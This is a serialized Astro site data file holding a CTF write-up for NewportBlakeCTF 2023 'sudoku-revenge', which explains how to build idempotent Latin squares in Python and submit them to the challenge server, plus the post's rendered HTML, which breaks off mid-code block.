[["Map",1,2,9,10],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.15.3","content-config-digest","e8e59afdbe9a4d70","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"site\":\"https://ahh.bet\",\"compressHTML\":true,\"base\":\"/\",\"trailingSlash\":\"ignore\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":false,\"port\":4321,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[],\"responsiveStyles\":false},\"devToolbar\":{\"enabled\":true},\"markdown\":{\"syntaxHighlight\":false,\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[],\"rehypePlugins\":[null,[null,{\"behavior\":\"wrap\"}],[null,{\"themes\":[\"github-dark\"],\"styleOverrides\":{\"borderRadius\":\"0.75rem\",\"borderColor\":\"rgb(55, 65, 81)\",\"codeFontSize\":\"0.875rem\",\"uiFontSize\":\"0.875rem\"},\"frames\":{\"showCopyToClipboardButton\":true}}]],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"security\":{\"checkOrigin\":true,\"allowedDomains\":[]},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false,\"liveContentCollections\":false,\"csp\":false,\"staticImportMetaEnv\":false,\"chromeDevtoolsWorkspace\":false,\"failOnPrerenderConflict\":false},\"legacy\":{\"collections\":false}}","blog",["Map",11,12,54,55,100,101,134,135],"newportblakectf-2023-sudoku-revenge",{"id":11,"data":13,"body":24,"filePath":25,"assetImports":26,"digest":28,"rendered":29,"legacyId":53},{"title":14,"date":15,"tags":16},"NewportBlakeCTF 2023: sudoku-revenge - Idempotent Latin Squares",["Date","2023-12-08T00:40:38.000Z"],[17,18,19,20,21,22,23],"combinatorics","latin-squares","mathematics","algorithms","python","ctf-writeup","graph-theory","# **sudoku-revenge | 7 solves**\n\nLet's play sudoku! For real this time...\n\n## **Description**\n\nThe TLDR of this challenge is to generate a Latin Square of size `n` such that given a permutation `a` containing numbers from 1 to n, the `a[i]`th cell of row `i` of our board has the value `i`. This proves to be quite straightforward for boards where `n` is odd, although proves to not be as intuitive for even `n`. However we can note that this problem is equivalent to the existance of an idempotent quasigroup of order n, or in other words, there is a latin square of size n such that the main diagonal is ordered numbers 1 to n. This turns out to have a quite simple inductive proof, and this proof can be used to generate boards for even `n`.\n\nWe are given a file `sudoku-revenge.py`. The code (while not very nicely formatted), does the following:\n\n- It generates a number `n` between 100, 200 which is the size of the board\n- It then generates a list `a` with numbers from `1` to `n`, and shuffles the list\n- Finally, it takes a `n`x`n` board as input, and validates that the `a[i]`th cell of row `i` of our board has the value `i`\n\nFirst off, we should note that there is a simpler problem we can solve first: which is:\n\n- Generate a Latin Square with the diagonals being `[1, n]` strictly increasing.\n\nThis works since columns of a latin square can clearly be shuffled, so we can simply shuffle each respective number into its original place. Since the `a` list is a permutation, this will always work.\n\nNow we can try generating a Latin Square, and theres a pretty simple way to do this:\n\n- Create an array from [1, n]\n- then repeatedly append the array rotated by 1 with wrapping.\n\nThe implementation is something like this:\n\n```py\nrow = [i for i in range(1, n+1)]\nm =  [row[-i:] + row[:-i] for i in range(n)]\n```\n\nConsider for example, `n = 5`:\n\n```\n|1, 2, 3, 4, 5|\n|5, 1, 2, 3, 4|\n|4, 5, 1, 2, 3|\n|3, 4, 5, 1, 2|\n|2, 3, 4, 5, 1|\n```\n\nNow as an observation, note the existance of 1, n in each row:\n\n```\n|1,  ,  ,  ,  |\n| ,  , 2,  ,  |\n| ,  ,  ,  , 3|\n| , 4,  ,  ,  |\n| ,  ,  , 5,  |\n```\n\nIt seems to be in row 1, 3, 5, ..., followed by row 2, 4, 6, ..., and this ends up being true for all odd n!\n\nBut if we try this strategy on even n:\n\n```\n|1, 2, 3, 4|\n|4, 1, 2, 3|\n|3, 4, 1, 2|\n|2, 3, 4, 1|\n```\n\n```\n|1,  ,  ,  |\n| ,  , 2,  |\n|3,  ,  ,  |\n| ,  , 4,  |\n```\n\nUnfortunately they overlap, so we cannot directly use this.\n\nI played with this for a while, trying different patterns and so on, but it wasnt trivial. I then found [this](https://faculty.etsu.edu/gardnerr/Design-Theory/notes-Design-Theory-LR2/Design-Theory-LR2-2-2.pdf) paper.\n![](image-1.png)\n\nWhat this exactly describes is a way to create a idempotent latin square of size n+1 from a idempotent latin square of size n.\n\n## **Solution**\n\nSo here is the overall idea. We can create a function called `create(n)` which creates a latin square of size n. For the odd case, its simple, we just unshuffle the rows in the way as described above.\n\n```py\n\ndef create(n: int):\n    if n % 2 == 1:\n        row = [i for i in range(1, n+1)]\n        m =  [row[-i:] + row[:-i] for i in range(n)]\n        narr = np.array(m).T\n        ret = [narr[i%n] for i in range(0, n*2, 2)]\n        return np.array(ret).T.tolist()\n```\n\nNow for the even case, we use the inductive strategy. We can first get a board of size n-1, which will be odd. Then we can apply the transformation as described.\n\n```py\n    else:\n        m = create(n - 1)\n        l = [m[i][: i + 1] + [n] + m[i][i + 2 :] + [m[i][i + 1]] for i in range(n - 2)]\n        l.append([n] + m[n - 2][1:] + [m[n - 2][0]])\n        l.append(\n            [\n                [\n                    x\n                    for x in range(1, n + 1)\n                    if x not in [l[x][i] for x in range(n - 1)]\n                ][0]\n                for i in range(n)\n            ]\n        )\n        return l\n```\n\nFinally, whenever we get an `n` from the server, and an `a` from the server, we can compute the idempotent latin square, then unshuffle it based on the a array.\n\n```py\np = remote(HOST, PORT)\nt = int(p.recvuntil(b\"\\n\").rstrip(b'\\n').decode())\n\nfor _ in range(t):\n    n = int(p.recvuntil(b\"\\n\").rstrip(b'\\n').decode())\n    a = [int(x) for x in p.recvuntil(b\"\\n\").rstrip(b'\\n').decode().split(' ')]\n\n    arr = create(n)\n    print(f\"n = {n}\")\n\n    t = np.array(arr).T\n    arr = [None for _ in range(n)]\n    for i, x in enumerate(a):\n        arr[x-1] = t[i].tolist()\n    mat = np.array(arr).T.tolist()\n\n    for x in mat:\n        p.sendline(' '.join(str(z) for z in x))\n\np.interactive()\n```\n\n---\n\n## Flag\n\n```\nnbctf{th1s_1s_whY_y0U_t3s7_tH3_ch3Ck3r_f1r57}\n```","src/content/blog/NewportBlakeCTF-2023-sudoku-revenge/index.md",[27],"image-1.png","aab99d7c62d8405b",{"html":30,"metadata":31},"\u003Ch1 id=\"sudoku-revenge--7-solves\">\u003Ca href=\"#sudoku-revenge--7-solves\">\u003Cstrong>sudoku-revenge | 7 solves\u003C/strong>\u003C/a>\u003C/h1>\n\u003Cp>Let’s play sudoku! For real this time…\u003C/p>\n\u003Ch2 id=\"description\">\u003Ca href=\"#description\">\u003Cstrong>Description\u003C/strong>\u003C/a>\u003C/h2>\n\u003Cp>The TLDR of this challenge is to generate a Latin Square of size \u003Ccode>n\u003C/code> such that given a permutation \u003Ccode>a\u003C/code> containing numbers from 1 to n, the \u003Ccode>a[i]\u003C/code>th cell of row \u003Ccode>i\u003C/code> of our board has the value \u003Ccode>i\u003C/code>. This proves to be quite straightforward for boards where \u003Ccode>n\u003C/code> is odd, although proves to not be as intuitive for even \u003Ccode>n\u003C/code>. However we can note that this problem is equivalent to the existance of an idempotent quasigroup of order n, or in other words, there is a latin square of size n such that the main diagonal is ordered numbers 1 to n. This turns out to have a quite simple inductive proof, and this proof can be used to generate boards for even \u003Ccode>n\u003C/code>.\u003C/p>\n\u003Cp>We are given a file \u003Ccode>sudoku-revenge.py\u003C/code>. The code (while not very nicely formatted), does the following:\u003C/p>\n\u003Cul>\n\u003Cli>It generates a number \u003Ccode>n\u003C/code> between 100, 200 which is the size of the board\u003C/li>\n\u003Cli>It then generates a list \u003Ccode>a\u003C/code> with numbers from \u003Ccode>1\u003C/code> to \u003Ccode>n\u003C/code>, and shuffles the list\u003C/li>\n\u003Cli>Finally, it takes a \u003Ccode>n\u003C/code>x\u003Ccode>n\u003C/code> board as input, and validates that the \u003Ccode>a[i]\u003C/code>th cell of row \u003Ccode>i\u003C/code> of our board has the value \u003Ccode>i\u003C/code>\u003C/li>\n\u003C/ul>\n\u003Cp>First off, we should note that there is a simpler problem we can solve first: which is:\u003C/p>\n\u003Cul>\n\u003Cli>Generate a Latin Square with the diagonals being \u003Ccode>[1, n]\u003C/code> strictly increasing.\u003C/li>\n\u003C/ul>\n\u003Cp>This works since columns of a latin square can clearly be shuffled, so we can simply shuffle each respective number into its original place. Since the \u003Ccode>a\u003C/code> list is a permutation, this will always work.\u003C/p>\n\u003Cp>Now we can try generating a Latin Square, and theres a pretty simple way to do this:\u003C/p>\n\u003Cul>\n\u003Cli>Create an array from [1, n]\u003C/li>\n\u003Cli>then repeatedly append the array rotated by 1 with wrapping.\u003C/li>\n\u003C/ul>\n\u003Cp>The implementation is something like this:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.zgx9u.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.p1z7b.js\">\u003C/script>\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">row \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [i \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, n\u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">m \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">  [row[\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">i:] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> row[:\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">i] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n)]\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"row = [i for i in range(1, n+1)]m =  [row[-i:] + row[:-i] for i in range(n)]\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Consider for example, \u003Ccode>n = 5\u003C/code>:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|1, 2, 3, 4, 5|\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|5, 1, 2, 3, 4|\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|4, 5, 1, 2, 3|\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|3, 4, 5, 1, 2|\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|2, 3, 4, 5, 1|\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"|1, 2, 3, 4, 5||5, 1, 2, 3, 4||4, 5, 1, 2, 3||3, 4, 5, 1, 2||2, 3, 4, 5, 1|\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Now as an observation, note the existance of 1, n in each row:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|1,  ,  ,  ,  |\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">| ,  , 2,  ,  |\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">| ,  ,  ,  , 3|\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">| , 4,  ,  ,  |\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">| ,  ,  , 5,  |\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"|1,  ,  ,  ,  || ,  , 2,  ,  || ,  ,  ,  , 3|| , 4,  ,  ,  || ,  ,  , 5,  |\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>It seems to be in row 1, 3, 5, …, followed by row 2, 4, 6, …, and this ends up being true for all odd n!\u003C/p>\n\u003Cp>But if we try this strategy on even n:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|1, 2, 3, 4|\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|4, 1, 2, 3|\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|3, 4, 1, 2|\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|2, 3, 4, 1|\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"|1, 2, 3, 4||4, 1, 2, 3||3, 4, 1, 2||2, 3, 4, 1|\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|1,  ,  ,  |\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">| ,  , 2,  |\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">|3,  ,  ,  |\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">| ,  , 4,  |\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"|1,  ,  ,  || ,  , 2,  ||3,  ,  ,  || ,  , 4,  |\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Unfortunately they overlap, so we cannot directly use this.\u003C/p>\n\u003Cp>I played with this for a while, trying different patterns and so on, but it wasnt trivial. I then found \u003Ca href=\"https://faculty.etsu.edu/gardnerr/Design-Theory/notes-Design-Theory-LR2/Design-Theory-LR2-2-2.pdf\">this\u003C/a> paper.\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;image-1.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>What this exactly describes is a way to create a idempotent latin square of size n+1 from a idempotent latin square of size n.\u003C/p>\n\u003Ch2 id=\"solution\">\u003Ca href=\"#solution\">\u003Cstrong>Solution\u003C/strong>\u003C/a>\u003C/h2>\n\u003Cp>So here is the overall idea. We can create a function called \u003Ccode>create(n)\u003C/code> which creates a latin square of size n. For the odd case, its simple, we just unshuffle the rows in the way as described above.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">create\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">int\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">row \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [i \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, n\u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">m \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">  [row[\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">i:] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> row[:\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">i] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">narr \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> np.array(m).T\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">ret \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [narr[i\u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">n] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, n\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> np.array(ret).T.tolist()\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"def create(n: int):    if n % 2 == 1:        row = [i for i in range(1, n+1)]        m =  [row[-i:] + row[:-i] for i in range(n)]        narr = np.array(m).T        ret = [narr[i%n] for i in range(0, n*2, 2)]        return np.array(ret).T.tolist()\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Now for the even case, we use the inductive strategy. We can first get a board of size n-1, which will be odd. Then we can apply the transformation as described.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">m \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> create(n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">l \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [m[i][: i \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [n] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> m[i][i \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> :] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [m[i][i \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">l.append([n] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> m[n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [m[n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">l.append(\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[\u003C/span>\u003C/div>\u003C/div>\u003Cdiv 